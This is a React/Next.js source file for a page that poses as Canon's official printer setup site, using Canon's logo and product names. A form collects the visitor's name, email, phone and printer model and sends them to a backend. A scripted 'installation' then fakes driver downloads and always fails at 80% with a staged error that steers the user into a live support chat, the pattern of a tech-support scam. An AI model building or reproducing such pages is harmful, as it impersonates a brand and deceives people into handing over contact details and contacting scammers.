

"use client";


import Link from "next/link";
import Image from "next/image";
import { useEffect, useMemo, useState } from "react";
import {
    FaComments,
    FaCheck,
    FaExclamationTriangle,
    FaPhone,
    FaPrint,
    FaUser,
    FaEnvelope,
    FaTag,
    FaRocket,
    FaSpinner,
} from "react-icons/fa";
import { RxCross2 } from "react-icons/rx";


export default function SetupPage() {
    const [isSetupOpen, setIsSetupOpen] = useState(false);
    const [view, setView] = useState("form"); // form | progress | error
    const [progress, setProgress] = useState(0);
    const [stepsState, setStepsState] = useState(
        () => [
            { icon: "clock", text: "Preparing installation environment..." },
            { icon: "download", text: "Fetching latest printer drivers..." },
            { icon: "cog", text: "Setting up printer preferences..." },
            { icon: "wifi", text: "Setting up wireless connection..." },
            { icon: "check", text: "Completing installation..." },
        ]
    );
    const [log, setLog] = useState([]);
    const [form, setForm] = useState({
        name: "",
        email: "",
        phone: "",
        model: "",
        brand: "Canon",
        agreement: true,
    });
    const [errors, setErrors] = useState({});
    const [isSubmitting, setIsSubmitting] = useState(false);

    const steps = useMemo(
        () => [
            { progress: 20, step: 0, message: "Initializing setup environment...", log: "Starting printer setup process" },
            { progress: 40, step: 1, message: "Downloading latest drivers...", log: "Downloading drivers from manufacturer server" },
            { progress: 60, step: 2, message: "Configuring printer settings...", log: "Setting up printer preferences and options" },
            { progress: 80, step: 3, message: "Configuring network settings...", log: "Setting up wireless connection" },
            { progress: 100, step: 4, message: "Finalizing installation...", log: "Completing setup process" },
        ],
        []
    );

    useEffect(() => {
        // Equivalent to DOMContentLoaded init logging
        // eslint-disable-next-line no-console
        // console.log("Setup page loaded", { timestamp: new Date().toISOString() });
    }, []);

    function openSetupModal() {
        // eslint-disable-next-line no-console
        // console.log("Setup Modal Opened", {
        //     timestamp: new Date().toISOString(),
        //     userAgent: typeof navigator !== "undefined" ? navigator.userAgent : "",
        // });
        setIsSetupOpen(true);
        setView("form");
        setProgress(0);
        setStepsState([
            { icon: "fa-solid fa-clock", text: "Preparing installation environment..." },
            { icon: "fa-solid fa-download", text: "Fetching latest printer drivers..." },
            { icon: "fa-solid fa-cog", text: "Setting up printer preferences..." },
            { icon: "fa-solid fa-wifi", text: "Setting up wireless connection..." },
            { icon: "fa-solid fa-check", text: "Completing installation..." },
        ]);
        setLog([]);
        setErrors({});
    }

    function closeSetupModal() {
        setIsSetupOpen(false);
    }

    function openChatAndcloseSetupModal(){
        closeSetupModal();
        openChat();
    }

    function updateField(name, value) {
        setForm(prev => ({ ...prev, [name]: value }));
        if (errors[name]) {
            setErrors(prev => ({ ...prev, [name]: undefined }));
        }
    }

    function validate() {
        const nextErrors = {};
        if (!form.name || form.name.trim().length < 2) nextErrors.name = "Name must be at least 2 characters long";
        ["email", "phone", "model"].forEach(k => {
            if (!form[k] || String(form[k]).trim() === "") nextErrors[k] = `${k[0].toUpperCase()}${k.slice(1)} is required`;
        });
        if (!form.agreement) nextErrors.agreement = "Please agree to be contacted by our support team";
        setErrors(nextErrors);
        return Object.keys(nextErrors).length === 0;
    }

    function addLog(message) {
        const timestamp = new Date().toLocaleTimeString();
        setLog(prev => [...prev, `[${timestamp}] ${message}`]);
    }

    function startInstallation() {
        setView("progress");
        setProgress(0);
        setStepsState([
            { icon: "fa-solid fa-clock", text: "Preparing installation environment..." },
            { icon: "fa-solid fa-download", text: "Fetching latest printer drivers..." },
            { icon: "fa-solid fa-cog", text: "Setting up printer preferences..." },
            { icon: "fa-solid fa-wifi", text: "Setting up wireless connection..." },
            { icon: "fa-solid fa-check", text: "Completing installation..." },
        ]);
        addLog("Starting printer setup process");

        let current = 0;
        function runNext() {
            const step = steps[current];
            if (!step) return;
            setProgress(step.progress);
            setStepsState(prev => prev.map((s, i) => (i === step.step ? { ...s, text: step.message, icon: "spinner" } : s)));
            addLog(step.log);

            const atEighty = step.progress === 80;
            current += 1;
            if (atEighty) {
                setTimeout(() => {
                    setView("error");
                    // eslint-disable-next-line no-console
                    // console.log("Installation error", {
                    //     errorCode: "INST_ERR_001",
                    //     description: "Driver compatibility issue detected",
                    //     progress: 80,
                    //     timestamp: new Date().toISOString(),
                    // });
                }, 2000);
                return;
            }
            setTimeout(() => {
                setStepsState(prev => prev.map((s, i) => (i === step.step ? { ...s, icon: "check", text: step.message.replace("...", " - Completed") } : s)));
                if (current < steps.length) {
                    setTimeout(runNext, 800);
                }
            }, 1000);
        }
        setTimeout(runNext, 2000);
    }

    async function onSubmit(e) {
        e.preventDefault();
        if (!validate()) return;
        try {
            setIsSubmitting(true);
            const res = await fetch("/api/setup", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    name: form.name,
                    email: form.email,
                    phone: form.phone,
                    model: form.model,
                    brand: form.brand,
                }),
            });
            const data = await res.json();
            if (!res.ok || !data?.ok) {
                setErrors(prev => ({ ...prev, submit: data?.error || "Failed to send setup request" }));
                return;
            }
            startInstallation();
        } catch (err) {
            setErrors(prev => ({ ...prev, submit: err?.message || "Network error" }));
        } finally {
            setIsSubmitting(false);
        }
    }

    function retryInstallation() {
        setView("progress");
        setProgress(0);
        setLog([]);
        startInstallation();
    }

    const openChat = () => {
    if (typeof window !== "undefined" && window.Tawk_API) {
      window.Tawk_API.maximize();
    }
  };


    return (
        <div className="canon-page bg-gradient-to-br from-gray-50 to-blue-50">
            <header className="fixed top-0 left-0 right-0 z-50 border-b border-gray-100 bg-white">
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                    <div className="flex h-[68px] items-center justify-between">
                        <Link href="/upgrade/cn" className="flex shrink-0 items-center">
                            <Image src="/canonlogo.png" alt="Canon" width={3840} height={2160} className="h-auto w-28 sm:w-32" />
                        </Link>
                        <nav aria-label="Canon printer product lines" className="flex items-center gap-4 sm:gap-6 lg:gap-8">
                            {["PIXMA", "MAXIFY", "imageCLASS"].map(productLine => (
                                <button
                                    key={productLine}
                                    type="button"
                                    onClick={openSetupModal}
                                    className="cursor-pointer whitespace-nowrap text-xs font-semibold text-gray-900 transition-colors hover:text-[#e41920] sm:text-sm"
                                >
                                    {productLine}
                                </button>
                            ))}
                        </nav>
                    </div>
                </div>
            </header>

            <section
                id="home"
                className="relative mt-16 overflow-hidden bg-[#cf0a0e] text-white"
            >
                <div className="absolute -left-24 -top-32 h-96 w-96 rounded-full bg-red-500/20" />
                {/* <div className="absolute -right-20 -bottom-48 h-[30rem] w-[30rem] rounded-full bg-red-800/20" /> */}
                <div className="relative mx-auto grid min-h-[360px] max-w-7xl items-center gap-4 px-5 py-10 sm:px-8 md:min-h-[390px] lg:grid-cols-[1.6fr_0.8fr] lg:gap-10 lg:px-12">
                    <div className="relative z-10 max-w-3xl">
                        <h1 className="mb-5 text-3xl font-medium tracking-tight sm:text-4xl lg:text-[40px]">
                            Set up your printer
                        </h1>
                        <p className="mb-7 max-w-2xl text-base leading-relaxed sm:text-lg">
                            Enter your <strong> product name and model number</strong> to get the right Canon software and drivers for you
                        </p>
                        <form
                            className="flex max-w-3xl gap-2 rounded-xl border-[5px] border-white/20 bg-white/10 p-1"
                            onSubmit={e => {
                                e.preventDefault();
                                openSetupModal();
                            }}
                        >
                            <label className="sr-only" htmlFor="canon-printer-model">Printer model</label>
                            <input
                                id="canon-printer-model"
                                type="text"
                                value={form.model}
                                onChange={e => updateField("model", e.target.value)}
                                placeholder="Enter Your Printer Model Here"
                                className="min-w-0 flex-1 rounded-lg bg-white px-4 py-3 text-sm text-gray-900 outline-none placeholder:text-gray-400 sm:px-5 sm:text-base"
                            />
                            <button
                                type="submit"
                                className="min-w-24 cursor-pointer rounded-lg bg-white px-5 py-3 font-semibold text-gray-900 transition-colors hover:bg-gray-100 sm:min-w-32"
                            >
                                Next
                            </button>
                        </form>
                    </div>
                    <div className="relative mx-auto flex w-full max-w-sm items-center justify-center lg:max-w-none">
                        <img
                            src="/canon1.png"
                            alt="Canon PIXMA printer"
                            className="w-full max-w-[300px] object-contain sm:max-w-[340px] lg:max-w-[360px]"
                        />
                    </div>
                </div>
            </section>

            <section className="bg-white">
                <div className="mx-auto grid min-h-[330px] max-w-7xl items-center gap-6 px-5 py-10 sm:px-8 md:min-h-[360px] lg:grid-cols-[1.7fr_0.8fr] lg:gap-12 lg:px-12">
                    <div className="max-w-3xl space-y-7 text-lg leading-relaxed text-gray-900 sm:text-xl">
                        <p>
                            Install software and drivers on each mobile device or computer you want to print from. Add the printer on the new device.
                        </p>
                        <p>
                            Need additional help with setup?{" "}
                            <button
                                type="button"
                                onClick={openChat}
                                className="cursor-pointer text-left underline decoration-1 underline-offset-4 hover:text-[#e41920]"
                            >
                                Chat with us.
                            </button>
                        </p>
                    </div>
                    <div className="flex items-center justify-center">
                        <img
                            src="/canon-MF445dw.webp"
                            alt="Canon printer"
                            className="w-full max-w-[330px] object-contain sm:max-w-[380px]"
                        />
                    </div>
                </div>
            </section>

            <footer className="border-t border-gray-200 bg-[#f5f5f5] text-gray-800">
                <div className="mx-auto max-w-7xl px-5 py-10 sm:px-8 lg:px-12 lg:py-14">
                    <div className="grid gap-10 sm:grid-cols-2 lg:grid-cols-[1.4fr_1fr_1fr_1fr] lg:gap-12">
                        <div className="max-w-sm">
                            <Link href="/upgrade/cn" className="mb-5 inline-flex items-center">
                                <Image src="/canonlogo.png" alt="Canon" width={3840} height={2160} className="h-10 w-auto" />
                            </Link>
                            <p className="mb-5 text-sm leading-6 text-gray-600">
                                Find setup guidance, software, and help for your printer.
                            </p>
                            <button
                                type="button"
                                onClick={openChat}
                                className="inline-flex cursor-pointer items-center gap-2 rounded border border-gray-400 px-4 py-2 text-sm font-semibold transition-colors hover:border-[#e41920] hover:text-[#e41920]"
                            >
                                <FaComments />
                                Chat with support
                            </button>
                        </div>

                        <div>
                            <h2 className="mb-4 text-sm font-bold uppercase tracking-wide text-gray-900">Product support</h2>
                            <ul className="space-y-3 text-sm text-gray-600">
                                {["Drivers & software", "Manuals", "Troubleshooting"].map(item => (
                                    <li key={item}>
                                        <button
                                            type="button"
                                            onClick={openSetupModal}
                                            className="cursor-pointer text-left transition-colors hover:text-[#e41920]"
                                        >
                                            {item}
                                        </button>
                                    </li>
                                ))}
                            </ul>
                        </div>

                        <div>
                            <h2 className="mb-4 text-sm font-bold uppercase tracking-wide text-gray-900">Setup help</h2>
                            <ul className="space-y-3 text-sm text-gray-600">
                                <li>
                                    <button type="button" onClick={openSetupModal} className="cursor-pointer text-left transition-colors hover:text-[#e41920]">
                                        Printer installation
                                    </button>
                                </li>
                                <li>
                                    <button type="button" onClick={openSetupModal} className="cursor-pointer text-left transition-colors hover:text-[#e41920]">
                                        Network setup
                                    </button>
                                </li>
                                <li>
                                    <button type="button" onClick={openChat} className="cursor-pointer text-left transition-colors hover:text-[#e41920]">
                                        Contact support
                                    </button>
                                </li>
                            </ul>
                        </div>

                        <div>
                            <h2 className="mb-4 text-sm font-bold uppercase tracking-wide text-gray-900">Information</h2>
                            <ul className="space-y-3 text-sm text-gray-600">
                                <li><Link href="/privacy-policy" className="transition-colors hover:text-[#e41920]">Privacy policy</Link></li>
                                <li><Link href="/terms-and-conditions" className="transition-colors hover:text-[#e41920]">Terms of use</Link></li>
                                <li><Link href="/refund-policy" className="transition-colors hover:text-[#e41920]">Refund policy</Link></li>
                            </ul>
                        </div>
                    </div>

                    <div className="mt-10 border-t border-gray-300 pt-5 text-xs leading-5 text-gray-500">
                        <p>&copy; {new Date().getFullYear()} All rights reserved.</p>
                    </div>
                </div>
            </footer>

            {/* Setup Modal */}
            {isSetupOpen && (
  <div className="fixed inset-0 z-50 bg-[#17252b75] flex items-center justify-center p-3 sm:p-6">
    <div className="relative w-full max-w-lg bg-white rounded-xl shadow-2xl overflow-hidden">

      {/* Accent Header */}
      <div className="relative bg-[#e41920] px-5 py-4 flex items-center justify-between">
        <div className="flex items-center gap-3 text-white">
          <div className="w-10 h-10 bg-white/20 rounded-lg flex items-center justify-center">
            <FaPrint />
          </div>
          <div>
            <h2 className="font-bold text-lg">Download and Setup</h2>
            <p className="text-xs opacity-90">Guided installation & support</p>
          </div>
        </div>

        <button
          onClick={closeSetupModal}
          className="w-8 h-8 rounded-lg cursor-pointer bg-white/20 hover:bg-white/30 flex items-center justify-center text-white"
        >
          <RxCross2 />
        </button>
      </div>

      {/* BODY */}
      <div className="p-5 sm:p-6 max-h-[80vh] overflow-y-auto">

        {/* ================= FORM VIEW ================= */}
        {view === "form" && (
          <form onSubmit={onSubmit} className="space-y-5">

            <div className="grid sm:grid-cols-2 gap-4">
              {[
                { id: "name", label: "Full Name", icon: <FaUser />, placeholder: "John Doe" },
                { id: "email", label: "Email", icon: <FaEnvelope />, placeholder: "email@example.com", type: "email" }
              ].map(f => (
                <div key={f.id}>
                  <label className="text-sm font-semibold text-gray-700 flex items-center gap-2 mb-1">
                    <span className="text-[#e41920]">{f.icon}</span> {f.label}
                  </label>
                  <input
                    type={f.type || "text"}
                    value={form[f.id]}
                    onChange={e => updateField(f.id, e.target.value)}
                    placeholder={f.placeholder}
                    className={`w-full rounded-lg border bg-white px-3 py-2 text-gray-900 placeholder:text-gray-400 opacity-100 outline-0 [color-scheme:light] focus:border-[#e41920]
                      ${errors[f.id] ? "border-red-500" : "border-gray-300"}`}
                  />
                  {errors[f.id] && <p className="text-red-500 text-xs mt-1">{errors[f.id]}</p>}
                </div>
              ))}
            </div>

            <div className="grid sm:grid-cols-2 gap-4">
              <div>
                <label className="text-sm font-semibold text-gray-700 flex items-center gap-2 mb-1">
                  <FaPhone className="text-[#e41920]" /> Phone
                </label>
                <input
                  value={form.phone}
                  onChange={e => updateField("phone", e.target.value)}
                  placeholder="Enter Phone No."
                  className={`w-full rounded-lg border bg-white px-3 py-2 text-gray-900 placeholder:text-gray-400 opacity-100 outline-0 [color-scheme:light] focus:border-[#e41920]
                    ${errors.phone ? "border-red-500" : "border-gray-300"}`}
                />
              </div>

              <div>
                <label className="text-sm font-semibold text-gray-700 flex items-center gap-2 mb-1">
                  <FaPrint className="text-[#e41920]" /> Printer Model
                </label>
                <input
                  value={form.model}
                  onChange={e => updateField("model", e.target.value)}
                  placeholder="Enter Printer Model"
                  className={`w-full rounded-lg border bg-white px-3 py-2 text-gray-900 placeholder:text-gray-400 opacity-100 outline-0 [color-scheme:light] focus:border-[#e41920]
                    ${errors.model ? "border-red-500" : "border-gray-300"}`}
                />
              </div>
            </div>

            <div>
              <label className="text-sm font-semibold text-gray-700 flex items-center gap-2 mb-1">
                <FaTag className="text-[#e41920]" /> Brand
              </label>
              <input
                type="text"
                name="brand"
                value={form.brand}
                readOnly
                className="w-full rounded-lg border border-gray-300 bg-white px-3 py-2 text-gray-900 opacity-100 outline-0 [color-scheme:light]"
              />
            </div>

            
            {errors.agreement && <p className="text-red-500 text-xs">{errors.agreement}</p>}

            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full cursor-pointer bg-[#e41920] text-white py-2.5 rounded-lg font-semibold hover:opacity-90 transition"
            >
              {isSubmitting ? <FaSpinner className="animate-spin inline mr-2" /> : <FaRocket className="inline mr-2" />}
              Start Setup
            </button>
          </form>
        )}

        {/* ================= PROGRESS VIEW ================= */}
        {view === "progress" && (
          <div className="space-y-4">
            <div className="flex justify-between text-sm font-semibold">
              <span>Setup Progress</span>
              <span>{progress}%</span>
            </div>

            <div className="h-3 bg-gray-200 rounded-full overflow-hidden">
              <div
                className="h-full bg-[#e41920] transition-all duration-500"
                style={{ width: `${progress}%` }}
              />
            </div>

            <div className="space-y-3">
              {stepsState.map((s, i) => (
                <div key={i} className="flex items-center gap-3 bg-gray-50 p-3 rounded-lg">
                  <div className="w-8 h-8 bg-[#e419201a] rounded-full flex items-center justify-center">
                    {s.icon === "spinner" ? <FaSpinner className="animate-spin" /> : <FaCheck />}
                  </div>
                  <div className="text-sm text-gray-700">{s.text}</div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* ================= ERROR VIEW ================= */}
        {view === "error" && (
          <div className="text-center space-y-4">
            <FaExclamationTriangle className="text-red-500 text-4xl mx-auto" />
            <h3 className="text-lg font-bold">Setup Failed</h3>
            <p className="text-sm text-gray-600">
              A compatibility issue occurred. Our team can help you immediately.
            </p>

            <div className="space-y-2">
              <button onClick={retryInstallation} className="w-full cursor-pointer bg-[#e41920] text-white py-2 rounded-lg">
                Retry
              </button>
              <button onClick={openChatAndcloseSetupModal} className="w-full cursor-pointer bg-green-600 text-white py-2 rounded-lg">
                Contact Support
              </button>
              <button onClick={closeSetupModal} className="w-full bg-gray-500 cursor-pointer text-white py-2 rounded-lg">
                Close
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  </div>
)}

        </div>
    );
}
